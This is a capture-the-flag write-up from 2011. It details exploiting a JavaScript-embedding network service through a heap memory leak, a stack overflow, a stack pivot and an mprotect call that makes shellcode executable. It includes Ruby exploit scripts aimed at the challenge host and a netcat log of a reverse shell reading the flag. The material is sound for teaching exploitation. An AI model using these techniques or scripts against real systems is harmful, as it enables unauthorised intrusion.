---
title: javascriptmd
layout: post
authors:
  - zoaedk
ctf: SmooCon Warmup
year: 2011
categories:
  - Pwn
---
A couple of PPP members (awesie, tylerni7) participated in the ShmooCon CTF Warmup. It was lots of fun and awesie got the prize! We also figured we should post a write-up for #3.

<!--more-->

## Finding the bugs

First things first, run file on the binary so we know what we are dealing with:

```
ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.15, stripped
```

A standard ELF executable? Let's open it up in IDA then.

It all looks fairly standard: drop privs, listen on port 2426, accept (and fork) loop. Once a connection is accepted, it reads some data from the connection, prints it to the screen, and then calls *do_js*.

Inside of the *do_js* function there are several calls to JS_* functions. Most are self-explanatory, but you can find a reference at [the JSAPI_Reference](https://developer.mozilla.org/en/SpiderMonkey/JSAPI_Reference). The basic structure is: init, create context, set some options, create global object, compile script, and then execute. None of this is particularly exciting, but it does tell us that our initial input will be parsed as javascript and then run.

The interesting part is the function call right before the call to *strlen* (which is right before the call to *JS_CompileScript*). This function makes some more calls to the JSAPI, which initialize a new class and then set the *fileno* property of this class. If you follow the function arguments, you will notice that it is set to the file descriptor of our socket.

According to the JSAPI reference, when you call *JS_InitClass* you give it a properties specification and a functions specification. In the function specification, we see that they specify three functions: *send* (0x080491FC), *recv* (0x0804939B), and *close* (0x080491C4). These are all straight forward so I am not going to detail them here. Instead, I will move on to the bugs in each of them.

Inside of *send*, we can control the number of bytes sent by giving the function a second argument that is a number. In this case, *send* will ignore the actual length of the string.

For *recv*, the first argument is the number of bytes to read from the socket. No sanity checking is done, so we can set this number greater than the size of buffer (0x400) and control the stack.

## Exploiting the bugs

This gives us two tools: information disclosure from the heap, and a stack overflow. A basic exploit input might be:

```
var socket = new Socket();
socket.send("AAAA", 0x1000);
socket.recv(0x428);
```

The number of bytes to send can be arbitrary; the number of bytes to receive is 0x428, because the receive buffer starts at 0x420 and you have 8 bytes for saved ebp and return address. Also, we will need to send more stuff after this, but this is the javascript code that we need to send.

First thing, what will we set the return address to? We can use the information disclosure bug to find out where a copy of our string, `AAAA`, is located in the heap. If I send the above javascript string, I get back from the server:

```
0000000: 4141 4141 0014 e8b7 7300 6f00 1900 0000  AAAA....s.o.....
0000010: 0000 0000 61e4 0001 0823 0708 c83d 0708  ....a....#...=..
                             | heap1  | heap2  |
```

At this point, a local copy of the server is essential. We can see that there are two heap address located in the server's output. Using *gdb*, we notice that the heap2 address always point to the beginning of this buffer (where `AAAA`; is located). It is also important to note that this buffer was created using *JS_GetStringBytes* which will output only the LSB of each unicode character. For instance, let's say that we were printing out `\u0102\u0304`, then the buffer will contain the bytes: `02 04`.

Now we have a buffer whose address we know and whose content we control. Perfect!

So now, the stack overflow. This part is simple (for now). Just send the server 0x424 bytes of junk data and then the heap2 address. If you run your exploit at this point, you will notice that it doesn't work. Why?

## Memory protections

Apparently, the server has non-executable heap space. Wonderful. Obvious solution: ret2libc exploit. One problem, what OS are they using? Luckily, the SSH banner doesn't lie:

```
SSH-2.0-OpenSSH_5.3p1 Debian-3ubuntu4
```

A google search indicates that this is probably Ubuntu Lucid. Unfortunately, another google search says that Ubuntu Lucid probably has library address randomization as well.

Can the information disclosure bug tell us where *libc* is located? I don't believe so. But it might be able to tell us where  *libmozjs* is located.

First thing to do is get a copy of *libmozjs.so* that might be on the server. The [xulrunner][1] Ubuntu package seems to have it. Open *libmozjs.so* in IDA to see if it is even useful.

At the very least, it is big enough that we might be able to do a ROP attack. But let's try something easier. While it doesn't import *execv* or *system*, it does import the *mprotect* function. We can use that to make our shellcode executable.

Now, we need to get the address of *mprotect*. According to IDA, it is looked at 0xEEF0 from the base of the library. The base of the library we can find using the information disclosure bug. Running our exploit again, we examine the server's output looking for address in the library area of memory (0xB7xxxxxx or so). Unfortunately, there isn't much there. So let's modify our javascript to send us more memory:

```
var socket = new Socket();
socket.send("AAAA", 0x10000);
socket.recv(0x428);
```

Now we should have more possible addresses. This memory might not be exactly what you see, but it is enough to understand. And there is probably a more reliable way of doing this, making use of the javascript engine's garbage collector.

```
0004290: 0100 0000 0000 0000 a0e7 edb7 4096 fdb7  ............@...
00042a0: 0000 0000 6c20 0708 9838 0708 4096 fdb7  ....l ...8..@...
00042b0: 0080 0708 0080 0708 7080 0708 1600 0000  ........p.......
00042c0: 1600 0000 0000 0000 0000 0008 0000 0000  ................
00042d0: 80b5 edb7 0000 0000 0000 0000 3422 0708  ............4"..
00042e0: 9838 0708 4096 fdb7 0080 0708 0080 0708  .8..@...........
00042f0: a880 0708 1600 0000 1600 0000 0000 0000  ................
0004300: 0000 0008 0000 0000 60b5 edb7 0000 0000  ........`.......
0004310: 0000 0000 3c22 0708 9838 0708 4096 fdb7  ....&lt;"...8..@...
0004320: 0080 0708 0080 0708 e080 0708 1600 0000  ................
0004330: 1600 0000 0000 0000 0200 0008 0000 0000  ................
0004340: 90b7 edb7 0000 0000 0000 0000 4c21 0708  ............L!..
```

In this area of output, we see several addresses that look plausible: b7ede7a0, b7edb560, b7edb580, b7edb790. Let's try and match these to something in IDA (this is easier to do if you do this procedure once locally with *gdb*). An easy place to start is by searching the function window in IDA for 560 and then look near it for functions that end with 580 and 790. The only addresses that match this are: 51560, 51580, and 51790.

We now have a candidate base address (0xB7E8A000), which we will try to verify using the other addresses we gathered.

```
b7ede7a0 -&gt; 547a0 (start of a function)
```

You can increase your confidence by looking at more addresses, but this looks good to me.


So let's assume that <em>libmozjs.so</em> is mapped starting at <em>0xB7E8A000.</em> This means that the <em>mprotect</em> import is at 0xB7E98EF0. We also need one more detail. Since this function is located inside of a dynamic library, and it isn't exported, it is assumed that <em>ebx</em> is correct. Using almost any export, you can figure out this address. Take <em>JS_ResumeRequest</em> as an example:


```
.text:00013D5C                 call    sub_F277
.text:00013D61                 add     ebx, 13A0CBh
```

So, ebx = <em>0xB7E8A000 + 0x13D61 + 0x13A0CB = 0x</em>B7FD7E2C. We can set ebx since it is restored in the <em>recv</em> function right before the <em>leave</em> instruction.

If we are going to return into <em>mprotect, </em>then we need to setup its arguments on the stack. Since I am writing this after the fact, I can say this won't work because the call to <em>JS_strdup</em> uses the arguments that you will have to overwrite. However, we have an area of memory that we control and know the address of (heap2). We can make this our new stack by using a stack pivot. A possible return address for the pivot is the end of the <em>recv</em> function (0x080494FB).

We now have two stacks: the stack that we are overwriting, and our new stack.

Our new stack will look something like:


```
[saved ebp] [mprotect] [shellcode address] [mprotect arg1] [mprotect arg2] [mprotect arg3]
```

This will execute mprotect with arguments we control and then return to an address of our choosing. For simplicity sakes, I will be putting the shellcode at the end of our new stack since we already know its memory address. The length of the new stack is 24 bytes. So our shellcode will be located at <em>heap2</em> + 24.

The arguments to mprotect are trivial: heap2 & 0xfffff000, 0x1000, 7. This just says set the protections of the page that contains our shellcode to be RWX.

Without the shellcode, our new stack looks like:

```
41 41 41 41 F0 8E E9 B7 E0 3D 07 08 00 30 07 08 00 10 00 00 07 00 00 00
```

As a javascript string, it would look similar to:

```
"\u0141\u0141\u0141\u0141\u01F0\u018E\u01E9\u01B7\u01E0\u013D\u0107\u0108\u0100\u0130\u0107\u0108\u0100\u0110\u0100\u0100\u0107\u0100\u0100\u0100"
```

Remember that the first byte of the unicode character will be ignored later.

Any shellcode that you like can be used. I suggest something small and that connects back to your box. For the purposes of the writeup, I assume your shellcode is 90 bytes.

Lastly, the bytes that will be received in <em>socket.recv</em>. We have mentioned these earlier, all together we get:

```
[junk data of length 0x41C] [ebx] [new stack (heap2)] [stack pivot code]
41 (x 0x41C) 2C 7E FD B7 C8 3D 07 08 FB 94 04 08
```

## Bringing it all together

You can use whichever language you prefer to create the exploit script. Below is a ruby script that would suffice (replace [shellcode] as appropriate).

```
#!/usr/bin/ruby
require 'socket'
host = "barcode.ghostintheshellcode.com"
port = 2426
t = TCPSocket.new(host,port)
t.print << 'EOF'
var socket = new Socket();
socket.send("\u0141\u0141\u0141\u0141\u01F0\u018E\u01E9\u01B7\u01E0\u013D\u0107\u0108\u0100\u0130\u0107\u0108\u0100\u0110\u0100\u0100\u0107\u0100\u0100\u0100[shellcode]", 0x100);
socket.recv(0x428);
EOF
t.flush
print t.recv(0x100)
t.print "A"*0x41C + "\x2C\x7E\xFD\xB7\xC8\x3D\x07\x08\xFB\x94\x04\x08"
t.flush
t.close
exit
```

Something that I noticed is that the size of the string you call <em>socket.send</em> with can affect its memory location, hence the reason I print out what the server outputs. The first time I ran the script, the address of the buffer changed:

```
0000080: 0000 0000 61e4 0001 0823 0708 607e 0708  ....a....#..`~..
```

Which means that I need to change every place I used heap2. My new script then was:

```
#!/usr/bin/ruby
require 'socket'
host = "barcode.ghostintheshellcode.com"
port = 2426
t = TCPSocket.new(host,port)
t.print << 'EOF'
var socket = new Socket();
socket.send("\u0141\u0141\u0141\u0141\u01F0\u018E\u01E9\u01B7\u0178\u017E\u0107\u0108\u0100\u0170\u0107\u0108\u0100\u0110\u0100\u0100\u0107\u0100\u0100\u0100[shellcode]",0x100);
socket.recv(0x428);
EOF
t.flush
print t.recv(0x100)
t.print "A"*0x41C + "\x2C\x7E\xFD\xB7\x60\x7E\x07\x08\xFB\x94\x04\x08"
t.flush
t.close
exit
```

Running this with shellcode, my netcat instance outputs:

```
listening on [any] 2222 ...
connect to [*] from ec2-50-16-200-223.compute-1.amazonaws.com [50.16.200.223] 44316
cat key.txt
Nice work, leet hacker you!

Now email gitsctf@ghostintheshellcode.com with the subject:
 JavaScrimp is a JavaShrimp
exit
```

Yay!

[1]: http://packages.ubuntu.com/lucid/i386/xulrunner-1.9.2/download